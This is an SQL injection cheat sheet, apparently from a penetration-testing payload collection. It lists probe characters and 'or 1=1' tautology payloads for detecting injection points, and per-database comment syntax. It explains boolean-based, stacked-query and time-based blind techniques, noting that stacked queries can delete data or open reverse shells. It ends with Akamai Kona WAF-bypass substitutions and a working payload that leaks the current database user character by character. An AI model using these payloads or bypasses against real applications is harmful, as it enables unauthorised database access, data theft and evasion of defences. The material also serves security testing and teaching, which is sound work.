# SQL Injection

## Entry point detection
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

## Entry point detection by Confirming with logical operations
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

## Comments
```
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

## All Kind of SQL Injection 
   - **Boolean-Based Blind**
   
we can manipulate the behavior of the sort depending on internal data. For example: if the admin username starts with an ‘a’ we sort the IDs in the query ASC (ascending) if not we sort them DESC (descending). This allows one to enumerate every single character of the username by just looking at the sort direction of the output.

   - **Stacked Queries**

we might add our own queries to the query. This one is tricky and quite dangerous. We are allowed to extend the query with new queries. This might allow one to [delete database](https://stackoverflow.com/questions/12403662/how-to-remove-all-mysql-tables-from-the-command-line-without-drop-database-permi) content, start [reverse shells](https://security.stackexchange.com/questions/6919/leveraging-a-shell-from-sql-injection) or easily create time based SQL attacks (more about that below) in order to retrieve data.

   - **Time-Based Blind**

most databases support the SLEEP() function. A function that pauses the execution of the query for a certain amount of seconds. We can use this to ex filtrate data by measuring the time it takes for the server to send a reply back. For example if the current database username of the server starts with a X we trigger a sleep for 2 seconds, if it starts with a Z a sleep for 4 seconds, etc. Repeat this for every position in the string and you can easily reconstruct the full username by looking at the response times of the request.

## Akamai Kona Bypass 
   - `MID` instead of `SUBSTRING`
   - `LIKE` instead of `=`
   - `/--/` instead of a `space`
   - `CURRENT_USER` instead of `CURRENT_USER()`
   - ` "` instead of `'`

Final example: 

```sql
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
```

## Blogs
   - http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/
   - http://isc.sans.edu/diary.html?storyid=9397
   - http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
   - http://xd-blog.com.ar/descargas/manuales/bugs/full-mssql-injection-pwnage.html
   - http://securityoverride.com/articles.php?article_id=1&article=The_Complete_Guide_to_SQL_Injections
   - http://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
   - http://sqlzoo.net/hack/
   - http://www.sqlteam.com/article/sql-server-versions
   - http://www.krazl.com/blog/?p=3
   - http://www.owasp.org/index.php/Testing_for_MS_Access
   - http://web.archive.org/web/20101112061524/http://seclists.org/pen-test/2003/May/0074.html
   - http://web.archive.org/web/20080822123152/http://www.webapptest.org/ms-access-sql-injection-cheat-sheet-EN.html
   - http://www.youtube.com/watch?v=WkHkryIoLD0
   - http://layerone.info/archives/2009/Joe%20McCray%20-%20Advanced%20SQL%20Injection%20-%20L1%202009.pdf
   - http://vimeo.com/3418947
   - http://sla.ckers.org/forum/read.php?24,33903
   - http://websec.files.wordpress.com/2010/11/sqli2.pdf
   - http://old.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/
   - http://ha.ckers.org/sqlinjection/
   - http://lab.mediaservice.net/notes_more.php?id=MSSQL

## Reference
   - https://medium.com/@jonathanbouman/blind-sql-injection-at-fasteditor-hema-com-6ac140c0d1a3
